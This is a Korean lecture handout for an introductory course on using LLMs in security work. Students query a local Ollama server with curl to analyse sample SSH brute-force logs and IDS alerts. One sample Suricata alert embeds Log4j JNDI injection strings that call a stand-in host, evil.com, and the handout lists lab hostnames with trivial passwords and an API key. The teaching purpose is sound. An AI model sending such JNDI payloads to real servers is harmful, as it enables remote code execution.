# Week 01: AI/LLM 보안 활용 개론

## 학습 목표
- 대규모 언어 모델(LLM)의 기본 개념과 작동 원리를 이해한다
- AI가 사이버보안 분야에서 활용되는 주요 영역을 파악한다
- Ollama를 사용하여 로컬 LLM에 API를 호출할 수 있다
- LLM에게 보안 로그를 분석하도록 요청하고 응답을 해석할 수 있다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---

---

## 용어 해설 (AI/LLM 보안 활용 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **LLM** | Large Language Model | 대규모 언어 모델 (GPT, Claude, Llama 등) | 방대한 텍스트로 훈련된 AI 두뇌 |
| **Ollama** | Ollama | 로컬에서 LLM을 실행하는 도구 | 내 PC에서 돌리는 AI |
| **프롬프트** | Prompt | LLM에게 보내는 입력 텍스트 | AI에게 하는 질문/지시 |
| **토큰** | Token (LLM) | LLM이 처리하는 텍스트의 최소 단위 (~4글자) | 단어의 조각 |
| **컨텍스트 윈도우** | Context Window | LLM이 한 번에 처리할 수 있는 최대 토큰 수 | AI의 단기 기억 용량 |
| **파인튜닝** | Fine-tuning | 사전 학습된 모델을 특정 목적에 맞게 추가 학습 | 일반의가 전공 수련 |
| **RAG** | Retrieval-Augmented Generation | 외부 데이터를 검색하여 LLM 응답에 반영 | AI가 자료를 찾아보고 답변 |
| **에이전트** | Agent (AI) | 도구를 사용하여 자율적으로 작업하는 AI 시스템 | AI 비서 (스스로 판단하고 실행) |
| **도구 호출** | Tool Calling | LLM이 외부 도구/API를 호출하는 기능 | AI가 계산기를 꺼내서 계산 |
| **하네스** | Harness | 에이전트를 관리·제어하는 프레임워크 | AI 비서의 업무 규칙·관리 시스템 |
| **Playbook** | Playbook | 자동화된 작업 절차 (도구/스킬의 순서화된 묶음) | 표준 작업 지침서 (SOP) |
| **PoW** | Proof of Work | 작업 증명 (해시 체인 기반 실행 기록) | 작업 일지 + 영수증 |
| **보상** | Reward (RL) | 태스크 실행 결과에 따른 점수 (+성공, -실패) | 성과급 |
| **Q-learning** | Q-learning | 보상을 기반으로 최적 행동을 학습하는 RL 알고리즘 | 시행착오로 최적 경로를 찾는 학습 |
| **UCB1** | Upper Confidence Bound | 탐험(exploration)과 활용(exploitation)을 균형 잡는 전략 | "가본 길 vs 안 가본 길" 선택 전략 |
| **SubAgent** | SubAgent | 대상 서버에서 명령을 실행하는 경량 런타임 | 현장 파견 직원 |

---

# Week 01: AI/LLM 보안 활용 개론

## 학습 목표
- 대규모 언어 모델(LLM)의 기본 개념과 작동 원리를 이해한다
- AI가 사이버보안 분야에서 활용되는 주요 영역을 파악한다
- Ollama를 사용하여 로컬 LLM에 API를 호출할 수 있다
- LLM에게 보안 로그를 분석하도록 요청하고 응답을 해석할 수 있다

## 전제 조건
- 리눅스 터미널 기본 사용 경험 (ls, cd, cat 수준)
- SSH 접속 방법 숙지 (Course 1 Week 01 완료 권장)
- curl 명령어 기초 이해
- JSON 형식에 대한 기본 이해

---

## 1. 인공지능과 LLM 기초 (40분)

### 1.1 인공지능(AI)이란?

인공지능(Artificial Intelligence)은 인간의 학습, 추론, 판단 능력을 컴퓨터로 구현하는 기술이다.

```
AI (인공지능)
├── ML (머신러닝) — 데이터에서 패턴을 학습
│   ├── 지도 학습 — 정답이 있는 데이터로 학습 (스팸 필터)
│   ├── 비지도 학습 — 정답 없이 패턴 발견 (이상 탐지)
│   └── 강화 학습 — 보상을 통해 최적 행동 학습
│       └── DL (딥러닝) — 심층 신경망으로 학습
│           └── Transformer — 문맥을 이해하는 모델
│               └── LLM — 대규모 텍스트로 학습한 언어 모델
│                   예) GPT-4, Claude, Gemma, LLaMA
```

### 1.2 LLM(대규모 언어 모델)이란?

LLM(Large Language Model)은 수십억~수조 개의 텍스트 데이터로 학습한 인공지능 모델이다. 인간의 언어를 이해하고 생성할 수 있다.

**핵심 특징**:
- 대량의 텍스트(책, 웹페이지, 코드)로 사전 학습 (Pre-training)
- "다음에 올 단어를 예측"하는 방식으로 학습
- 별도의 프로그래밍 없이 자연어로 지시 가능

### 1.3 Transformer 아키텍처 (간단 이해)

2017년 구글의 "Attention Is All You Need" 논문에서 제안된 Transformer는 현대 LLM의 핵심 구조이다.

```
입력 텍스트: "보안 로그를 분석해"

  토큰화  |  "보안" "로그" "를" "분석" "해"
  (Tokenizer)  |  → [1523, 4821, 102, 8934, 567]
↓
  임베딩  |  각 토큰을 고차원 벡터로 변환
  (Embedding)  |  [1523] → [0.23, -0.15, 0.87, ...]
↓
  Self-  |  "분석"이라는 단어가 "로그"와
  Attention  |  관련이 높다는 것을 학습
  |  (문맥 이해의 핵심!)
↓
  Feed-  |  어텐션 결과를 비선형 변환
  Forward
↓
(위 과정을 수십~수백 층 반복)
↓
  출력 생성  |  다음 단어 확률 분포에서 샘플링
  (Decode)  |  → "네," "보안" "로그를" "분석하겠습니다"
```

**Self-Attention의 직관적 이해**:

문장: "서버가 해킹당해서 로그를 확인했더니 **그것**이 삭제되어 있었다."

사람은 "그것"이 "로그"를 가리킨다는 것을 자연스럽게 안다. Self-Attention은 바로 이 능력을 모델에게 부여한다. 모든 단어가 다른 모든 단어를 "주의(Attention)"하면서, 어떤 단어와 관련이 깊은지를 점수로 계산한다.

### 1.4 LLM의 주요 파라미터

| 파라미터 | 설명 | 예시 |
|---------|------|------|
| **모델 크기** | 학습 가능한 파라미터 수 | 7B (70억), 12B (120억), 70B (700억) |
| **컨텍스트 윈도우** | 한 번에 처리할 수 있는 토큰 수 | 4K, 8K, 128K |
| **Temperature** | 출력의 창의성/무작위성 조절 | 0.0(결정적) ~ 2.0(매우 무작위) |
| **Top-p** | 확률 상위 p%에서 다음 토큰 선택 | 0.9 → 상위 90% 중에서 선택 |
| **양자화 (Quantization)** | 모델 크기를 줄이는 기법 | FP16 → INT8 → INT4 |

### 1.5 주요 LLM 모델 비교

| 모델 | 제작사 | 크기 | 특징 | 라이선스 |
|------|--------|------|------|---------|
| GPT-4o | OpenAI | 비공개 | 최고 수준 범용 성능 | 상용 (API) |
| Claude 3.5 | Anthropic | 비공개 | 안전성 중시, 긴 컨텍스트 | 상용 (API) |
| Gemma 3 | Google | 1B ~ 27B | 가벼운 오픈소스 | 오픈 |
| LLaMA 3.1 | Meta | 8B ~ 405B | 강력한 오픈소스 | 오픈 |
| Qwen 2.5 | Alibaba | 0.5B ~ 72B | 다국어 지원 우수 | 오픈 |

**우리 실습 환경**: `dgx-spark` 서버에서 Ollama를 통해 **gemma3:12b** 모델을 사용한다.

---

## 2. AI와 사이버보안 (30분)

> **이 실습을 왜 하는가?**
> "AI/LLM 보안 활용 개론" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> AI/LLM 보안 활용 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

### 2.1 사이버보안에서 AI의 활용 영역

AI는 사이버보안의 거의 모든 영역에서 활용되고 있다.

```
[AI in Cybersecurity]

  방어 (Blue)          공격 (Red)          관리/분석
  -----------------    -----------------   ----------------------
  로그 분석             자동 취약점 스캐닝    보안 정책 자동 생성
  이상 탐지             페이로드 생성         인시던트 보고서 작성
  악성코드 탐지          소셜 엔지니어링       컴플라이언스 점검
  피싱 탐지             퍼징                 위협 인텔리전스 분석
  SOAR 자동화           우회 기법 연구        보안 교육/훈련
  WAF 규칙 최적화                            코드 리뷰/취약점 발견
```

### 2.2 세부 활용 사례

#### (1) 로그 분석 (Log Analysis)
보안 장비(방화벽, IDS, SIEM)가 생성하는 대량의 로그를 AI가 분석하여 이상 징후를 탐지한다.

**기존 방식**: 보안 분석가가 수천 줄의 로그를 수동으로 검토
**AI 방식**: LLM이 로그 패턴을 분석하고 이상 징후를 자동 요약

```
예시 로그:
Mar 27 03:15:22 web sshd: Failed password for root from 185.220.101.42 port 4521
Mar 27 03:15:23 web sshd: Failed password for root from 185.220.101.42 port 4522
Mar 27 03:15:24 web sshd: Failed password for root from 185.220.101.42 port 4523
... (500회 반복)

AI 분석 결과:
"185.220.101.42에서 root 계정에 대한 SSH 브루트포스 공격이 탐지됨.
3:15:22부터 500회 시도. 즉시 해당 IP를 방화벽에서 차단할 것을 권장."
```

#### (2) 위협 탐지 (Threat Detection)
네트워크 트래픽, 시스템 동작에서 비정상적 패턴을 감지한다.

#### (3) 취약점 평가 (Vulnerability Assessment)
코드를 분석하여 보안 취약점을 발견하고 수정 방안을 제시한다.

#### (4) 자동화된 침투 테스트 (Automated Pentesting)
AI가 공격 경로를 자동으로 탐색하고 취약점을 발견한다.

### 2.3 현재 AI 보안 도구 생태계

| 도구/서비스 | 역할 | 유형 |
|-----------|------|------|
| **Microsoft Copilot for Security** | 인시던트 분석, KQL 쿼리 생성 | 상용 |
| **Google SecOps (Chronicle)** | SIEM + AI 위협 탐지 | 상용 |
| **CrowdStrike Charlotte AI** | 위협 인텔리전스 분석 | 상용 |
| **Wazuh + LLM** | 오픈소스 SIEM에 LLM 연동 | 오픈소스 |
| **OpsClaw** | IT 운영/보안 자동화 (우리 실습 플랫폼!) | 오픈소스 |
| **PentestGPT** | LLM 기반 침투 테스트 보조 | 오픈소스 |

### 2.4 AI 보안 도구의 한계

| 한계 | 설명 |
|------|------|
| **환각 (Hallucination)** | AI가 사실이 아닌 정보를 자신있게 생성 |
| **컨텍스트 제한** | 긴 로그 파일 전체를 한번에 처리 불가 |
| **최신 정보 부재** | 학습 데이터 이후의 새로운 취약점 모름 |
| **판단력 부재** | 분석은 가능하나 최종 의사결정은 인간 필요 |
| **적대적 공격** | 프롬프트 인젝션으로 우회 가능 |

---

## 3. Ollama와 로컬 LLM (20분)

### 3.1 Ollama란?

Ollama는 로컬 환경에서 LLM을 쉽게 실행할 수 있게 해주는 도구이다.

**장점**:
- 데이터가 외부로 전송되지 않는다 (프라이버시)
- 인터넷 없이도 사용 가능하다
- API 비용이 없다
- OpenAI 호환 API를 제공한다

### 3.2 우리 실습 환경의 Ollama

```
dgx-spark (192.168.0.105)
├── NVIDIA GPU
├── Ollama 서버 (포트 11434)
│   ├── gemma3:12b    ← 주로 사용할 모델
│   ├── llama3.1:8b
│   └── (기타 모델들)
└── API 엔드포인트: http://192.168.0.105:11434
```

### 3.3 Ollama API 구조

Ollama는 두 가지 API 형식을 지원한다:

| API | 엔드포인트 | 특징 |
|-----|----------|------|
| **Ollama 네이티브** | `/api/generate`, `/api/chat` | Ollama 고유 형식 |
| **OpenAI 호환** | `/v1/chat/completions` | OpenAI SDK 호환 |

---

## 4. 실습: Ollama API 호출 (60분)

> **이 실습의 목적:**
> Ollama는 **로컬 LLM 서버**이다. OpenAI/Claude API와 달리 데이터가 외부로 나가지 않으므로
> 보안이 중요한 환경에서 LLM을 활용할 수 있다. 이 실습에서는:
> 1. Ollama 서버 상태를 확인하고
> 2. 사용 가능한 모델 목록을 조회하고
> 3. 실제로 보안 관련 질문을 해서 응답을 받는다
>
> **이걸 하면 무엇을 알 수 있는가?**
> - LLM API의 기본 동작 원리 (HTTP POST → JSON 응답)
> - 모델별 크기/속도/품질 차이
> - 보안 업무(로그 분석, 룰 생성, 보고서)에 LLM을 활용하는 첫 경험
>
> **검증 완료:** Ollama(192.168.0.105:11434)에 22개 모델 확인, gemma3:12b 응답 약 5초

### 실습 4.1: Ollama 서버 상태 확인

opsclaw 서버에서 dgx-spark의 Ollama 서버에 접근한다.

> **실습 목적**: 로컬 LLM 서버(Ollama)에 API를 호출하여, 데이터를 외부로 보내지 않고 AI를 보안 업무에 활용하는 첫 경험을 한다.
>
> **배우는 것**: Ollama API의 구조(모델 목록 조회, 채팅 완성 호출)와, 보안 로그를 LLM에게 분석시키는 기본 워크플로우를 익힌다.
>
> **결과 해석**: `/api/tags` 응답에 모델 목록이 나오면 Ollama 정상 동작이다. 모델별 size 필드로 메모리 요구량을, parameter_size로 모델 성능 수준을 판단한다.
>
> **실전 활용**: 보안 관제에서 대량 로그 분석, 경보 요약, Suricata 룰 생성 등에 로컬 LLM을 활용하면 비용 절감과 데이터 주권을 동시에 확보할 수 있다.

```bash
# opsclaw 서버에 SSH 접속
sshpass -p1 ssh -o StrictHostKeyChecking=no opsclaw@10.20.30.201
```

```bash
# Ollama 서버 상태 확인
curl http://192.168.0.105:11434/
# 예상 출력: Ollama is running
```

```bash
# 사용 가능한 모델 목록 확인
curl http://192.168.0.105:11434/api/tags
# 예상 출력 (정리된 형태):
# {
#   "models": [
#     {
#       "name": "gemma3:12b",
#       "size": 8145637376,
#       "details": {
#         "parameter_size": "12B",
#         "quantization_level": "Q4_K_M"
#       }
#     },
#     ...
#   ]
# }
```

```bash
# 모델 목록을 보기 쉽게 정리 (jq가 설치된 경우)
curl -s http://192.168.0.105:11434/api/tags | python3 -m json.tool
# 또는
curl -s http://192.168.0.105:11434/api/tags | jq '.models[].name'
```

### 실습 4.2: 간단한 텍스트 생성 (Ollama 네이티브 API)

```bash
# /api/generate 엔드포인트 사용 (단순 텍스트 생성)
curl -X POST http://192.168.0.105:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "prompt": "사이버보안이란 무엇인가? 한국어로 3문장으로 설명해줘.",
    "stream": false
  }'
# 예상 출력:
# {
#   "model": "gemma3:12b",
#   "response": "사이버보안은 컴퓨터 시스템, 네트워크, 데이터를...",
#   "done": true,
#   "total_duration": 5234567890,
#   ...
# }
```

**주요 파라미터 설명**:
- `model`: 사용할 모델 이름
- `prompt`: AI에게 보내는 지시/질문
- `stream`: false이면 전체 응답을 한번에 받음, true이면 토큰 단위로 스트리밍

### 실습 4.3: 대화형 API (Chat)

```bash
# /api/chat 엔드포인트 사용 (대화형)
curl -X POST http://192.168.0.105:11434/api/chat \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {
        "role": "system",
        "content": "당신은 사이버보안 전문가입니다. 질문에 한국어로 명확하게 답변하세요."
      },
      {
        "role": "user",
        "content": "SQL Injection이 뭔지 초보자에게 설명해줘."
      }
    ],
    "stream": false
  }'
```

**메시지 역할(Role) 설명**:

| 역할 | 설명 | 예시 |
|------|------|------|
| `system` | AI의 행동/성격을 정의 | "보안 전문가로서 답변하라" |
| `user` | 사용자의 질문/요청 | "SQL Injection이 뭔지 설명해줘" |
| `assistant` | AI의 이전 답변 (대화 이력) | (이전 대화를 기억시킬 때 사용) |

### 실습 4.4: OpenAI 호환 API 사용

많은 보안 도구가 OpenAI API 형식을 지원하므로, 이 형식도 알아두면 유용하다.

```bash
# OpenAI 호환 API (/v1/chat/completions)
curl -X POST http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {
        "role": "system",
        "content": "You are a cybersecurity analyst. Respond in Korean."
      },
      {
        "role": "user",
        "content": "방화벽(Firewall)의 역할을 설명해줘."
      }
    ],
    "temperature": 0.3
  }'
# 예상 출력 (OpenAI 형식):
# {
#   "id": "chatcmpl-xxx",
#   "object": "chat.completion",
#   "choices": [
#     {
#       "index": 0,
#       "message": {
#         "role": "assistant",
#         "content": "방화벽은 네트워크 트래픽을 모니터링하고..."
#       },
#       "finish_reason": "stop"
#     }
#   ],
#   "usage": {
#     "prompt_tokens": 42,
#     "completion_tokens": 156,
#     "total_tokens": 198
#   }
# }
```

**응답 구조 분석**:
- `choices[0].message.content`: AI의 실제 답변 텍스트
- `usage.prompt_tokens`: 입력에 사용된 토큰 수
- `usage.completion_tokens`: 출력에 사용된 토큰 수
- `finish_reason`: "stop"이면 정상 완료, "length"이면 최대 길이 도달

### 실습 4.5: Temperature 비교 실험

같은 질문을 다른 Temperature로 호출하여 차이를 관찰한다.

```bash
# Temperature 0.0 (결정적, 항상 같은 답변)
curl -X POST http://192.168.0.105:11434/api/chat \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [{"role":"user","content":"해킹을 방지하는 방법 3가지를 나열해."}],
    "stream": false,
    "options": {"temperature": 0.0}
  }'
```

```bash
# Temperature 1.5 (창의적, 매번 다른 답변)
curl -X POST http://192.168.0.105:11434/api/chat \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [{"role":"user","content":"해킹을 방지하는 방법 3가지를 나열해."}],
    "stream": false,
    "options": {"temperature": 1.5}
  }'
```

```bash
# 두 결과를 비교해보자.
# Temperature 0.0은 여러 번 실행해도 거의 같은 결과가 나온다.
# Temperature 1.5는 매번 다른 답변이 나온다.
# 보안 분석에서는 일관된 결과가 중요하므로 낮은 temperature(0.0~0.3)를 권장한다.
```

### 실습 4.6: 보안 로그 분석 실습

실제 보안 시나리오: SSH 브루트포스 공격 로그를 LLM에게 분석시킨다.

```bash
# 샘플 로그를 LLM에게 분석 요청
curl -X POST http://192.168.0.105:11434/api/chat \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {
        "role": "system",
        "content": "당신은 SOC(보안관제센터) 분석가입니다. 주어진 로그를 분석하고 위협 여부를 판단하세요. 분석 결과를 다음 형식으로 작성하세요: 1) 요약 2) 위협 유형 3) 위험도(상/중/하) 4) 권장 조치"
      },
      {
        "role": "user",
        "content": "다음 로그를 분석해주세요:\n\nMar 27 03:15:22 web sshd[12345]: Failed password for root from 185.220.101.42 port 45210 ssh2\nMar 27 03:15:23 web sshd[12346]: Failed password for root from 185.220.101.42 port 45211 ssh2\nMar 27 03:15:24 web sshd[12347]: Failed password for root from 185.220.101.42 port 45212 ssh2\nMar 27 03:15:25 web sshd[12348]: Failed password for admin from 185.220.101.42 port 45213 ssh2\nMar 27 03:15:26 web sshd[12349]: Failed password for admin from 185.220.101.42 port 45214 ssh2\nMar 27 03:15:27 web sshd[12350]: Failed password for ubuntu from 185.220.101.42 port 45215 ssh2\nMar 27 03:15:28 web sshd[12351]: Accepted password for root from 185.220.101.42 port 45216 ssh2"
      }
    ],
    "stream": false,
    "options": {"temperature": 0.1}
  }'
```

**분석 포인트**:
- AI가 마지막 줄의 "Accepted password" (로그인 성공)을 감지했는가?
- 브루트포스 패턴을 인식했는가?
- 적절한 대응 조치를 제안했는가?

### 실습 4.7: Suricata 알림 분석

IDS/IPS 알림을 LLM에게 분석시킨다. Log4j RCE 공격 시도를 담은 Suricata 알림을 전달하여 위협 수준과 대응 방법을 자동 평가한다.

```bash
# Suricata IDS 알림을 LLM에 전달하여 위협 평가
# temperature 0.1: 보안 분석은 일관성 있는 낮은 값 사용
curl -X POST http://192.168.0.105:11434/api/chat \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {
        "role": "system",
        "content": "당신은 네트워크 보안 분석가입니다. Suricata IDS 알림을 분석하고 위협을 평가하세요."
      },
      {
        "role": "user",
        "content": "다음 Suricata 알림을 분석해주세요:\n\n[**] [1:2024897:3] ET EXPLOIT Apache Log4j RCE Attempt (http ldap) [**]\n[Classification: Attempted Administrator Privilege Gain] [Priority: 1]\n03/27-10:15:33.123456  10.0.0.100:54321 -> 10.20.30.80:8080\nTCP TTL:64 TOS:0x0 ID:54321 IpLen:20 DgmLen:1024\nPayload: ${jndi:ldap://evil.com/a}\n\n[**] [1:2024897:3] ET EXPLOIT Apache Log4j RCE Attempt (http ldap) [**]\n[Classification: Attempted Administrator Privilege Gain] [Priority: 1]\n03/27-10:15:34.234567  10.0.0.100:54322 -> 10.20.30.80:8080\nPayload: ${jndi:ldap://evil.com/b}"
      }
    ],
    "stream": false,
    "options": {"temperature": 0.1}
  }'
```

### 실습 4.8: 보안 보고서 자동 생성

LLM에게 수집된 정보를 바탕으로 보안 보고서를 작성하게 한다. 인시던트 세부 정보를 전달하면 정형화된 보고서를 자동 생성한다.

```bash
# SSH 브루트포스 인시던트 정보를 LLM에 전달하여 보고서 자동 생성
# temperature 0.2: 보고서는 사실에 기반한 낮은 창의성이 적합
curl -X POST http://192.168.0.105:11434/api/chat \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {
        "role": "system",
        "content": "당신은 보안 관제 보고서를 작성하는 전문가입니다. 주어진 정보를 바탕으로 깔끔한 인시던트 보고서를 한국어로 작성하세요."
      },
      {
        "role": "user",
        "content": "다음 정보를 인시던트 보고서로 작성해줘:\n\n- 일시: 2026-03-27 03:15\n- 대상: web 서버 (10.20.30.80)\n- 공격 유형: SSH 브루트포스\n- 출발지 IP: 185.220.101.42 (Tor 출구 노드)\n- 시도 횟수: 500회\n- 결과: root 계정으로 로그인 성공\n- 탐지 수단: Wazuh SIEM 알림\n- 현재 상태: 해당 세션 아직 활성 중"
      }
    ],
    "stream": false,
    "options": {"temperature": 0.2}
  }'
```

### 실습 4.9: 응답에서 정보 추출하기

API 응답에서 실제 답변 텍스트만 추출하는 방법을 익힌다.

```bash
# jq를 사용하여 응답 텍스트만 추출
curl -s -X POST http://192.168.0.105:11434/api/chat \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [{"role":"user","content":"리눅스에서 열린 포트를 확인하는 명령어 3개를 알려줘."}],
    "stream": false,
    "options": {"temperature": 0.0}
  }' | python3 -c "import sys,json; print(json.load(sys.stdin)['message']['content'])"
```

```bash
# OpenAI 호환 API에서 응답 텍스트 추출
curl -s -X POST http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [{"role":"user","content":"nmap 기본 사용법을 알려줘."}],
    "temperature": 0.0
  }' | python3 -c "import sys,json; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

---

## 5. LLM 응답의 신뢰성 평가 (10분)

### 5.1 환각(Hallucination) 확인

LLM은 그럴듯하지만 **완전히 틀린 정보**를 생성할 수 있다.

```bash
# 환각 테스트: 존재하지 않는 CVE에 대해 물어보기
curl -s -X POST http://192.168.0.105:11434/api/chat \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [{"role":"user","content":"CVE-2026-99999에 대해 설명해줘."}],
    "stream": false,
    "options": {"temperature": 0.0}
  }' | python3 -c "import sys,json; print(json.load(sys.stdin)['message']['content'])"
# 주의: 존재하지 않는 CVE인데도 AI가 그럴듯한 설명을 만들어낼 수 있다!
# 이것이 바로 "환각(Hallucination)"이다.
```

### 5.2 보안 분석에서의 LLM 사용 원칙

1. **검증**: LLM의 출력을 항상 공식 소스(NVD, MITRE)와 대조한다
2. **보조 도구**: LLM은 분석을 도와주는 보조 도구이지, 최종 판단자가 아니다
3. **민감 데이터 주의**: 외부 API에 실제 보안 로그를 전송하지 않는다 (로컬 LLM 사용 이유)
4. **프롬프트 설계**: 구체적이고 구조화된 프롬프트가 더 좋은 결과를 낸다

---

## 과제

### 과제 1: LLM 모델 비교 (필수)
gemma3:12b와 다른 모델(llama3.1:8b 등)에게 동일한 보안 로그 분석을 요청하고, 결과를 비교하라.
- 동일한 로그와 프롬프트 사용
- 각 모델의 분석 정확도, 응답 속도, 응답 품질을 평가

### 과제 2: 보안 로그 분석 프롬프트 설계 (필수)
다음 시나리오에 대해 효과적인 system 프롬프트를 작성하라:
- 시나리오: 웹 서버의 Apache 접근 로그에서 SQL Injection 공격 시도를 탐지
- 요구사항: 공격 분류, 위험도, 영향 범위, 대응 방안을 포함하는 분석 결과

### 과제 3: 환각 탐지 실험 (선택)
LLM에게 보안 관련 질문 5개를 하고, 각 답변의 사실 여부를 공식 소스와 대조하여 정확도를 평가하라.
- 질문 예: "CVE-2021-44228의 CVSS 점수는?", "Suricata의 기본 포트는?"

---

## 검증 체크리스트

실습 완료 후 다음 항목을 스스로 확인한다:

- [ ] LLM이 무엇의 약자이며 어떻게 작동하는지 설명할 수 있는가?
- [ ] Transformer의 Self-Attention이 하는 역할을 비유로 설명할 수 있는가?
- [ ] AI가 보안에 활용되는 영역을 3가지 이상 말할 수 있는가?
- [ ] `curl`로 Ollama API를 호출할 수 있는가?
- [ ] system, user, assistant 역할의 차이를 설명할 수 있는가?
- [ ] Temperature 파라미터가 출력에 미치는 영향을 이해했는가?
- [ ] LLM에게 보안 로그를 분석시키고 결과를 해석할 수 있는가?
- [ ] 환각(Hallucination)이 무엇인지, 왜 위험한지 설명할 수 있는가?
- [ ] 보안 분석에서 LLM을 사용할 때의 주의사항 3가지를 말할 수 있는가?

---

## 다음 주 예고

**Week 02: 프롬프트 엔지니어링과 보안 자동화**
- 효과적인 보안 분석 프롬프트 설계 기법
- Few-shot, Chain-of-Thought 프롬프팅
- Python으로 Ollama API를 활용한 자동 로그 분석 스크립트 작성
- 실습 인프라의 실제 Wazuh 알림을 LLM으로 분석

---

---

## 자가 점검 퀴즈 (5문항)

이번 주차의 핵심 기술 내용을 점검한다.

**Q1.** Ollama API에서 temperature=0의 효과는?
- (a) 최대 창의성  (b) **매번 동일한 출력 (결정론적)**  (c) 에러 발생  (d) 속도 향상

**Q2.** OpsClaw execute-plan 실행 전 반드시 거쳐야 하는 단계는?
- (a) 서버 재시작  (b) **plan → execute stage 전환**  (c) DB 백업  (d) 코드 컴파일

**Q3.** RL에서 UCB1 탐색 전략의 핵심은?
- (a) 항상 최고 보상 행동 선택  (b) **방문 횟수가 적은 행동을 우선 탐색**  (c) 무작위 선택  (d) 모든 행동 균등 선택

**Q4.** Playbook이 LLM adhoc보다 재현성이 높은 이유는?
- (a) LLM이 더 똑똑해서  (b) **파라미터가 결정론적으로 바인딩되어 동일 명령 생성**  (c) 네트워크가 빨라서  (d) DB가 달라서

**Q5.** OpsClaw evidence가 제공하는 핵심 가치는?
- (a) 실행 속도 향상  (b) **모든 실행의 자동 기록으로 감사 추적 가능**  (c) 메모리 절약  (d) 코드 자동 생성

**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b

---
---

> **실습 환경 검증 완료** (2026-03-28): Ollama 22모델(gemma3:12b ~5s), OpsClaw 50프로젝트, execute-plan 병렬, RL train/recommend
